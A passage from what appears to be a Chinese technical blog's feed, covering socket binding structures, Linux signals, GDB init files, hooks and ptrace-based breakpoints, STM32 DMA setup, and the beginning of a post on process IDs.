class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> sock, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span>;<br><span class="hljs-comment">//参数</span><br>    <span class="hljs-comment">//sock：套接字的文件描述符</span><br>    <span class="hljs-comment">//addr；包含ip地址和接口号的结构体</span><br>    <span class="hljs-comment">//addrlen：结构体的长度</span><br><br><span class="hljs-comment">//返回值：0：success -1；error</span><br><br>使用：<br><span class="hljs-comment">//创建套接字</span><br><span class="hljs-type">int</span> serv_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><span class="hljs-comment">//创建sockaddr_in结构体变量</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">serv_addr</span>;</span><br><span class="hljs-built_in">memset</span>(&amp;serv_addr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(serv_addr));  <span class="hljs-comment">//每个字节都用0填充</span><br>serv_addr.sin_family = AF_INET;  <span class="hljs-comment">//使用IPv4地址</span><br>serv_addr.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);  <span class="hljs-comment">//具体的IP地址</span><br>serv_addr.sin_port = htons(<span class="hljs-number">1234</span>);  <span class="hljs-comment">//端口</span><br><span class="hljs-comment">//将套接字和IP、端口绑定</span><br>bind(serv_sock, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serv_addr, <span class="hljs-keyword">sizeof</span>(serv_addr));<br></code></pre></td></tr></table></figure><p>sockaddr_in结构体成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span>&#123;</span><br>    <span class="hljs-type">sa_family_t</span>     sin_family;   <span class="hljs-comment">//地址族（Address Family），也就是地址类型</span><br>    <span class="hljs-type">uint16_t</span>        sin_port;     <span class="hljs-comment">//16位的端口号</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span>  <span class="hljs-title">sin_addr</span>;</span>     <span class="hljs-comment">//32位IP地址</span><br>    <span class="hljs-type">char</span>            sin_zero[<span class="hljs-number">8</span>];  <span class="hljs-comment">//不使用，一般用0填充</span><br>&#125;;<br><br>in_addr结构体：<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span>&#123;</span><br>    <span class="hljs-type">in_addr_t</span>  s_addr;  <span class="hljs-comment">//32位的IP地址</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311282257033.png"></p><p>sockaddr结构体与sockaddr_in结构体：</p><p>为什么要将<code>sockaddr</code>结构体强制转换为<code>sockadr_in</code>结构体：</p><p>sockaddr 和 <code>sockaddr_in</code> 的长度相同，都是16字节，只是将IP地址和端口号合并到一起，用一个成员 <code>sa_data</code> 表示。要想给 <code>sa_data</code> 赋值，必须同时指明IP地址和端口号，例如”127.0.0.1:80“，遗憾的是，没有相关函数将这个字符串转换成需要的形式，也就很难给 sockaddr 类型的变量赋值，所以使用 <code>sockaddr_in</code> 来代替。这两个结构体的长度相同，强制转换类型时不会丢失字节，也没有多余的字节。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311282258675.png"></p><p><code>sockaddr</code> 是一种通用的结构体，可以用来保存多种类型的IP地址和端口号，而 <code>sockaddr_in</code> 是专门用来保存 IPv4 地址的结构体。另外还有 <code>sockaddr_in6</code>，用来保存 IPv6 地址。</p><h3 id="connect-函数"><a href="#connect-函数" class="headerlink" title="connect()函数"></a>connect()函数</h3><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> sock, <span class="hljs-keyword">struct</span> sockaddr *serv_addr, <span class="hljs-type">socklen_t</span> addrlen)</span>; <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>socket</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>signal总结</title>
    <link href="/2023/11/28/signal%E6%80%BB%E7%BB%93/"/>
    <url>/2023/11/28/signal%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>总结Linux系统中的signal</p><span id="more"></span><h2 id="常见的slgnal种类-1-9号"><a href="#常见的slgnal种类-1-9号" class="headerlink" title="常见的slgnal种类 1-9号"></a>常见的slgnal种类 1-9号</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">SIGHUP <span class="hljs-comment">#挂起</span><br>SIGINI <span class="hljs-comment">#中断</span><br>SIGQUIT <span class="hljs-comment">#尽可能终止</span><br>SIGILL <span class="hljs-comment">#未知指令</span><br>SIGTRAP <span class="hljs-comment">#自陷</span><br>SIGABRT <span class="hljs-comment">#终止进程</span><br>SIGBUS <span class="hljs-comment">#内存访问错误</span><br>SIGFPE <span class="hljs-comment">#算术异常</span><br>SIGKILL <span class="hljs-comment">#直接杀死</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>GDB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GPIO</title>
    <link href="/2023/11/26/GPIO/"/>
    <url>/2023/11/26/GPIO/</url>
    
    <content type="html"><![CDATA[<p>总结stm32中的GPIO外设</p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>内核外设</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GDB详解</title>
    <link href="/2023/11/26/GDB%E8%AF%A6%E8%A7%A3/"/>
    <url>/2023/11/26/GDB%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>总结学习GDB的知识点</p><span id="more"></span><h1 id="GDB的初始化文件"><a href="#GDB的初始化文件" class="headerlink" title="GDB的初始化文件"></a>GDB的初始化文件</h1><p>GDB会在执行的时候运行一些初始化文件。这些初始化文件或者说是配置文件有三个等级。</p><p>系统配置文件</p><p>用户配置文件</p><p>本地配置文件</p><h2 id="系统配置文件"><a href="#系统配置文件" class="headerlink" title="系统配置文件"></a>系统配置文件</h2><p>首先运行的是系统初始化文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/gdb/gdbinit<br>/etc/gdb/gdbinit.d<br></code></pre></td></tr></table></figure><p>其中<code>gdbinit</code>这是单个系统范围的初始化文件。它的位置由 –with-system-gdbinit 配置选项指定。它在 GDB 启动时首先加载，然后再处理命令行选项。</p><p><code>gdbinit.d</code>这是系统范围的初始化目录。它的位置由 –with-system-gdbinit-dir 配置选项指定。当 GDB 启动时，在处理命令行选项之前，此目录中的文件会在 system.gdbinit （如果启用）之后立即按字母顺序加载。文件需要具有可识别的脚本语言扩展名 ( .py &#x2F; .scm ) 或使用 .gdb 扩展名命名才能解释为常规 GDB 命令。<strong>GDB 不会递归到该目录的任何子目录。</strong></p><h2 id="用户配置文件"><a href="#用户配置文件" class="headerlink" title="用户配置文件"></a>用户配置文件</h2><p>系统配置文件的作用范围是所有的用户，用户的配置文件是作用于单个用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$XDG_CONFIG_HOME</span>/gdb/gdbinit<br><span class="hljs-variable">$HOME</span>/.config/gdb/gdbinit<br><span class="hljs-variable">$HOME</span>/.gdbinit<br></code></pre></td></tr></table></figure><p>其中<code>$XDG_CONFIG_HOME</code>是一个gdb的环境变量。</p><div class="note note-info">            <p>不管是系统配置文件还是用户配置文件，都可以使用<code>-nx</code>命令行选项来阻止加载系统范围的初始化文件</p>          </div><div class="note note-success">            <p>如果想要执行本地初始化文件，而不是系统的，或者是用户的则需要在<code>$XDG_CONFIG_HOME/gdb/gdbinit</code>或者是<code>$HOME/.config/gdb/gdbinit</code>中加入：</p>          </div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">add-auto-load-safe-path /your/path/.gdbinit<br><br><span class="hljs-comment">#或者是这样，但是这相当于关闭了安全路径</span><br><br>add-auto-load-safe-path /<br></code></pre></td></tr></table></figure><p>当然你也可以直接指定配置文件通过<code>-x</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb -x ./path/.gdbinit<br></code></pre></td></tr></table></figure><h2 id="三者的执行顺序"><a href="#三者的执行顺序" class="headerlink" title="三者的执行顺序"></a>三者的执行顺序</h2><p><strong>系统初始化</strong>-&gt;<strong>用户初始化</strong>-&gt;<strong>本地初始化</strong></p><p>并且，最后执行的初始化文件具有决定性的作用。</p><h2 id="小细节"><a href="#小细节" class="headerlink" title="小细节"></a>小细节</h2><p>gdb的命令很多，gdb把之分成许多个种类。help命令只是例出gdb的命令种类，如果要看种类中的命令，可以使用<code> help &lt;class&gt;</code> 命令，如：<code>help breakpoints</code>，查看设置断点的所有命令。也可以直接<code>help &lt;command&gt;</code>来查看命令的帮助。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://sourceware.org/gdb/current/onlinedocs/gdb.html/Initialization-Files.html#Initialization-Files">https://sourceware.org/gdb/current/onlinedocs/gdb.html/Initialization-Files.html#Initialization-Files</a></p><p><a href="https://blog.csdn.net/xiaoyuwz1234/article/details/51762748">https://blog.csdn.net/xiaoyuwz1234/article/details/51762748</a></p><p><a href="https://blog.csdn.net/tyustli/article/details/133363847">https://blog.csdn.net/tyustli/article/details/133363847</a></p><h1 id="gdbinit文件的配置"><a href="#gdbinit文件的配置" class="headerlink" title=".gdbinit文件的配置"></a><code>.gdbinit</code>文件的配置</h1><h2 id="基本的语法组成"><a href="#基本的语法组成" class="headerlink" title="基本的语法组成"></a>基本的语法组成</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs txt">define &lt;command&gt;<br> <br>&lt;code&gt;<br> <br>end<br> <br>document &lt;command&gt;  当在gdb中输入help command时显示的文本<br> <br>&lt;help text&gt;<br> <br><br>Usage:  简要命令的描述 使用命令help user查看<br><br>end<br><br></code></pre></td></tr></table></figure><p>如果输入 help user 命令，您会看到已在 .gdbinit 文件中输入的所有用户命令的摘要。.gdbinit 用户定义命令的设计者提供了一个重要特性，您在编写自己的命令时不应忽略该特性：document … end 子句。随着这些命令数量的增加，维护有关命令如何工作的功能文档将变得非常关键。</p><p><strong>所以我们可以通过这个文件定制自己的gdb</strong></p><h2 id="在-gdbinit文件中定义钩子函数"><a href="#在-gdbinit文件中定义钩子函数" class="headerlink" title="在.gdbinit文件中定义钩子函数"></a>在.gdbinit文件中定义钩子函数</h2><p>钩子函数就是在某事件发生时执行这个函数，gdb中的钩子函数语法：</p><p>当运行具有钩子函数的命令<code>foo</code>时，这个钩子函数会先于命令<code>foo</code>运行。使用语法<code>hook-foo</code>。</p><p>语法<code>hookpost-foo</code>是指在<code>foo</code>命令运行完之后，再运行钩子函数。</p><p>例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">define hook-echo<br><span class="hljs-built_in">echo</span> &lt;&lt;&lt;---<br>end<br><br>define hookpost-echo<br><span class="hljs-built_in">echo</span> ---&gt;&gt;&gt;\n<br>end<br><br>(gdb) <span class="hljs-built_in">echo</span> Hello World<br>&lt;&lt;&lt;---Hello World---&gt;&gt;&gt;<br>(gdb)<br></code></pre></td></tr></table></figure><p><strong>注意</strong>：钩子函数可以为所有的单数命令定义，但是不可以为命令的简称定义。如可以为<code>backtrace</code>命令写钩子，但是不可以为<code>bt</code>命令写钩子。尽管这两个命令含义是一样的。</p><p><strong>具有多个单词的命令如何编写钩子？</strong>：</p><p>我们可以通过将hook-或hookpost-添加到命令的最后一个字来钩子多字命令，例如define target hook-remote“将钩子添加到target remote。</p><p>如果在执行钩子期间发生错误，GDB命令的执行将停止，GDB将发出提示（在您实际键入的命令有机会运行之前）。</p><p>如果尝试定义与任何已知命令都不匹配的钩子，则会从define命令得到警告。</p><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/wads23456/article/details/105064833">https://blog.csdn.net/wads23456/article/details/105064833</a></p><p><a href="https://github.com/gdbinit/Gdbinit/blob/master/gdbinit">已经定义好的.gdbinit文件</a></p><p><a href="https://codeantenna.com/a/8Qh7GXnwCE">钩子函数</a></p><p><a href="https://blog.csdn.net/kking_edc/article/details/114746806">https://blog.csdn.net/kking_edc/article/details/114746806</a></p><p><a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Hooks.html#Hooks">在.gdbinit文件中定义钩子函数</a></p><h1 id="gdb插件"><a href="#gdb插件" class="headerlink" title="gdb插件"></a>gdb插件</h1><ul><li><p><a href="https://www.cnblogs.com/liuhanxu/p/17011775.html">https://www.cnblogs.com/liuhanxu/p/17011775.html</a></p></li><li><p>其中gdbgui还可以。</p></li><li><p>gdb-peda</p></li><li><p><a href="https://pengfeixc.com/blogs/clang/gdb-debug-2-and-3">https://pengfeixc.com/blogs/clang/gdb-debug-2-and-3</a></p></li></ul><h1 id="gdb的工作原理"><a href="#gdb的工作原理" class="headerlink" title="gdb的工作原理"></a>gdb的工作原理</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406212240109.png"></p><p>gdb 通过系统调用 <code>ptrace</code> 来接管一个进程的执行。ptrace 系统调用提供了一种方法使得父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。它主要用来实现断点调试和系统调用跟踪。ptrace 系统调用的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-type">long</span> <span class="hljs-title function_">ptrace</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> __ptrace_request request, <span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span> *addr, <span class="hljs-type">void</span> *data)</span>;<br></code></pre></td></tr></table></figure><ul><li><p><strong>pid_t pid</strong>：指示 ptrace 要跟踪的进程。</p></li><li><p>*_void addr_：指示要监控的内存地址。</p></li><li><p>*_void data_：存放读取出的或者要写入的数据。</p></li><li><p><strong>enum __ptrace_request request</strong>：决定了系统调用的功能，几个主要的选项：</p><ul><li><p>_PTRACE_TRACEME_：表示此进程将被父进程跟踪，任何信号（除了 <code>SIGKILL</code>）都会暂停子进程，接着阻塞于 <code>wait()</code> 等待的父进程被唤醒。子进程内部对 <code>exec()</code> 的调用将发出 <code>SIGTRAP</code> 信号，这可以让父进程在子进程新程序开始运行之前就完全控制它。</p></li><li><p>_PTRACE_ATTACH_：attach 到一个指定的进程，使其成为当前进程跟踪的子进程，而子进程的行为等同于它进行了一次 PTRACE_TRACEME 操作。但需要注意的是，虽然当前进程成为被跟踪进程的父进程，但是子进程使用 <code>getppid()</code> 的到的仍将是其原始父进程的 pid。</p></li><li><p>_PTRACE_CONT_：继续运行之前停止的子进程。可同时向子进程交付指定的信号。</p></li></ul></li></ul><h2 id="断点的实现"><a href="#断点的实现" class="headerlink" title="断点的实现"></a>断点的实现</h2><p>断点的功能是通过内核信号实现的，在 <code>x86</code> 架构上，内核向某个地址打入断点，实际上就是往该地址写入断点指令 <code>INT 3</code>，即 <code>0xCC</code> 。目标程序运行到这条指令之后会触发 <code>SIGTRAP</code> 信号，<code>gdb</code> 捕获这个信号，并根据目标程序当前停止的位置查询 <code>gdb</code> 维护的断点链表，若发现在该地址确实存在断点，则可判定为断点命中。</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>GDB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DMA外设</title>
    <link href="/2023/11/26/DMA%E5%A4%96%E8%AE%BE/"/>
    <url>/2023/11/26/DMA%E5%A4%96%E8%AE%BE/</url>
    
    <content type="html"><![CDATA[<p>总结stm32中的片上外设DMA</p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>是<strong>片上外设</strong></p><p>DMA(Direct Memory Access)—直接存储器存取，是单片机的一个外设，它的主要功能是用来搬数据，但是不需要占用CPU,即在传输数据的时候，CPU可以干其他的事情，好像是多线程一样。</p><p>这里的存储器可以是FLASH也可以是SARM。</p><div class="note note-info">            <p>DMA只是一帮助cpu缓解压力的“小cpu”，其并不是存储空间，而是控制数据传输的方向。</p>          </div><p>stm32f103系列DMA有DMA1和DMA2两个控制器，DMA1有7个通道，DMA2有5个通道，不同的DMA控制器的通道对应着不同的外设请求， 这决定了我们在软件编程上该怎么设置，具体见DMA请求映像表。</p><h2 id="DMA的组成"><a href="#DMA的组成" class="headerlink" title="DMA的组成"></a>DMA的组成</h2><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p>最主要的是有DMA控制器，其控制着整个DNA外设，并且在stm32中一般有两个DMA。一个是DMA1一个是DMA2，DMA是只有大容量、互联型的产品中才会有。</p><p>DMA具有12个独立可编程的通道，其中DMA1有7个通道，DMA2有5个通道，每个通道对应不同的外设的DMA请求。 <strong>虽然每个通道可以接收多个外设的请求，但是同一时间只能接收一个，不能同时接收多个。</strong></p><p>DMA的映射如下：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202311260217508.png"></p><p>其中ADC3、SDIO和TIM8的DMA请求只在大容量产品中存在，这个在具体项目时要注意。</p><h3 id="仲裁器"><a href="#仲裁器" class="headerlink" title="仲裁器"></a>仲裁器</h3><p>当有多个通道同时传输信号时，我们需要仲裁先后顺序。这分为两步：</p><ol><li>软件自定义，通过在DMA_CCRx寄存器中设置，有4个等级：非常高、高、中和低四个优先级。我们可以自己控制优先级。</li><li>硬件判断，当没有设置软件优先级或者是软件优先级是相同的，此时通过判断通道号，越小优先级越高。</li></ol><p><strong>在大容量产品和互联型产品中， DMA1控制器拥有高于DMA2控制器的优先级。</strong></p><hr><h1 id="DMA的数据配置"><a href="#DMA的数据配置" class="headerlink" title="DMA的数据配置"></a>DMA的数据配置</h1><p>DMA作为一个关于数据传输的片上外设，其最重要的六点是：</p><p><strong>数据从哪里来、数据到哪里去、传输多少数据、分为几次传输、一次传输数据的单位是多少。传输完成了吗</strong><br>下面我们来逐个解决这些问题</p><h2 id="数据从哪里来、到哪里去"><a href="#数据从哪里来、到哪里去" class="headerlink" title="数据从哪里来、到哪里去"></a>数据从哪里来、到哪里去</h2><p>在stm32中，只有以下三种数据传输的方向：</p><ol><li>外设到存储器：以ADC采集为例。DMA外设寄存器的地址对应的就是ADC数据寄存器的地址， DMA存储器的地址就是我们自定义的变量（用来接收存储AD采集的数据）的地址。方向我们设置外设为源地址。</li><li>存储器到外设：stm32发送数据到上位机，这个存储器就是FLASH，外设就是USART</li><li>存储器到存储器：将SARM中的数据传输到FLASH中。跟上面两个不一样的是，这里需要把DMA_CCR位14：MEM2MEM：存储器到存储器模式配置为1，启动M2M模式。</li></ol><h2 id="传输多少、一次传输单位是什么"><a href="#传输多少、一次传输单位是什么" class="headerlink" title="传输多少、一次传输单位是什么"></a>传输多少、一次传输单位是什么</h2><p>要传输好数据，我们必须使双方的数据传输的单位（大小）一致。</p><h3 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h3><p>当外设和存储器之间传数据时，两边的数据宽度应该设置为一致大小。</p><h3 id="设置增量模式"><a href="#设置增量模式" class="headerlink" title="设置增量模式"></a>设置增量模式</h3><p>在DMA控制器的控制下，数据要想有条不紊的从一个地方搬到另外一个地方，还必须正确设置两边数据指针的增量模式。 外设的地址指针由DMA_CCRx的PINC配置，存储器的地址指针由MINC配置。以串口向电脑发送数据为例，要发送的数据很多，每发送完一个，那么存储器的地址指针就应该加1，而串口数据寄存器只有一个， 那么外设的地址指针就固定不变。具体的数据指针的增量模式由实际情况决定。</p><h2 id="一次传输还是多次传输"><a href="#一次传输还是多次传输" class="headerlink" title="一次传输还是多次传输"></a>一次传输还是多次传输</h2><p>传输完成还分两种模式，是一次传输还是循环传输，一次传输很好理解，即是传输一次之后就停止，<strong>要想再传输的话， 必须关断DMA使能后再重新配置后才能继续传输</strong>。循环传输则是一次传输完成之后又恢复第一次传输时的配置循环传输， 不断的重复。具体的由DMA_CCR寄存器的CIRC 循环模式位控制。</p><h2 id="传输完成了吗"><a href="#传输完成了吗" class="headerlink" title="传输完成了吗?"></a>传输完成了吗?</h2><p>数据什么时候传输完成，我们可以通过查询标志位或者通过中断的方式来鉴别。<strong>每个DMA通道在DMA传输过半、 传输完成和传输错误时都会有相应的标志位</strong>，如果使能了该类型的中断后，则会产生中断。有关各个标志位的详细描述请参考DMA中断状态寄存器DMA_ISR的详细描述。</p><hr><h1 id="DMA编程"><a href="#DMA编程" class="headerlink" title="DMA编程"></a>DMA编程</h1><p>DMA_ InitTypeDef初始化结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint32_t</span> DMA_PeripheralBaseAddr;   <span class="hljs-comment">// 外设地址</span><br>    <span class="hljs-type">uint32_t</span> DMA_MemoryBaseAddr;       <span class="hljs-comment">// 存储器地址</span><br>    <span class="hljs-type">uint32_t</span> DMA_DIR;                  <span class="hljs-comment">// 传输方向</span><br>    <span class="hljs-type">uint32_t</span> DMA_BufferSize;           <span class="hljs-comment">// 传输数目</span><br>    <span class="hljs-type">uint32_t</span> DMA_PeripheralInc;        <span class="hljs-comment">// 外设地址增量模式</span><br>    <span class="hljs-type">uint32_t</span> DMA_MemoryInc;            <span class="hljs-comment">// 存储器地址增量模式</span><br>    <span class="hljs-type">uint32_t</span> DMA_PeripheralDataSize;   <span class="hljs-comment">// 外设数据宽度</span><br>    <span class="hljs-type">uint32_t</span> DMA_MemoryDataSize;       <span class="hljs-comment">// 存储器数据宽度</span><br>    <span class="hljs-type">uint32_t</span> DMA_Mode;                 <span class="hljs-comment">// 模式选择</span><br>    <span class="hljs-type">uint32_t</span> DMA_Priority;             <span class="hljs-comment">// 通道优先级</span><br>    <span class="hljs-type">uint32_t</span> DMA_M2M;                  <span class="hljs-comment">// 存储器到存储器模式</span><br>&#125; DMA_InitTypeDef;<br></code></pre></td></tr></table></figure><h2 id="DMA配置步骤"><a href="#DMA配置步骤" class="headerlink" title="DMA配置步骤"></a>DMA配置步骤</h2><ol><li>使用RCC函数打开DMA时钟</li><li>定义配置结构体，初始化配置</li><li>使用DMA_Init函数完成初始化</li><li>使用DMA_Cmd函数开启DMA</li></ol>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>片上外设</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pid详解</title>
    <link href="/2023/11/25/pid/"/>
    <url>/2023/11/25/pid/</url>
    
    <content type="html"><![CDATA[<p>vscode的基本组成组件</p><span id="more"></span><h1 id="进程ID及进程间的关系"><a href="#进程ID及进程间的关系" class="headerlink" title="进程ID及进程间的关系"></a>进程ID及进程间的关系</h1><h2 id="进程ID"><a href="#进程ID" class="headerlink" title="进程ID"></a>进程ID</h2><p>进程相关的 <code>ID</code> 有多种，除了进程标识 <strong>PID</strong> 外，还包括：线程组标识 <strong>TGID</strong>，进程组标识 <strong>PGID</strong>，回话标识 <strong>SID</strong>。<strong>TGID&#x2F;PGID&#x2F;SID</strong> 分别是相关线程组长&#x2F;进程组长&#x2F;回话 leader 进程的 <strong>PID</strong>。</p><p>下面分别介绍这几种ID。</p><h3 id="PID"><a href="#PID" class="headerlink" title="PID"></a>PID</h3><ul><li><p>进程总是会被分配一个唯一标识它们的进程ID号，简称 <strong>PID</strong>。</p></li><li><p>用 <code>fork</code> 或 <code>clone</code> 产生的每个进程都由内核自动地分配了一个唯一的 <strong>PID</strong> 。</p></li><li><p><strong>PID</strong> 保存在 <a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L943">task_struct-&gt;pid</a>中。</p></li></ul><h3 id="TGID"><a href="#TGID" class="headerlink" title="TGID"></a>TGID</h3><ul><li><p>进程以 <code>CLONE_THREAD</code> 标志调用 <code>clone</code> 方法，创建与该进程共享资源的线程。线程有独立的<a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L723">task_struct</a>，但它 <code>task_struct</code>内的 <a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L1070">files_struct</a>、<a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L1067">fs_struct</a> 、<a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L1081">sighand_struct</a>、<a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L1080">signal_struct</a>和<a href="https://github.com/torvalds/linux/blob/8bb7eca972ad531c9b149c0a51ab43a417385813/include/linux/sched.h?_pjax=%23js-repo-pjax-container,%20div%5Bitemtype=%22http://schema.org/SoftwareSourceCode%22%5D%20main,%20%5Bdata-pjax-container%5D#L857">mm_struct</a> 等数据结构仅仅是对进程相应数据结构的引用。</p></li><li><p>由进程创建的所有线程都有相同的线程组ID(<strong>TGID</strong>)。线程有自己的 <strong>PID</strong>，它的<strong>TGID</strong> 就是进程的主线程的 <strong>PID</strong>。如果进程没有使用线程，则其 <strong>PID</strong> 和 <strong>TGID</strong> 相同。</p></li><li><p>在内核中进程和线程都用 <code>task_struct</code>表示，而有了 <strong>TGID</strong>，我们就可以知道 <code>task_struct</code> 代表的是一个进程还是一个线程。</p></li><li><p><strong>TGID</strong> 保存在 <a 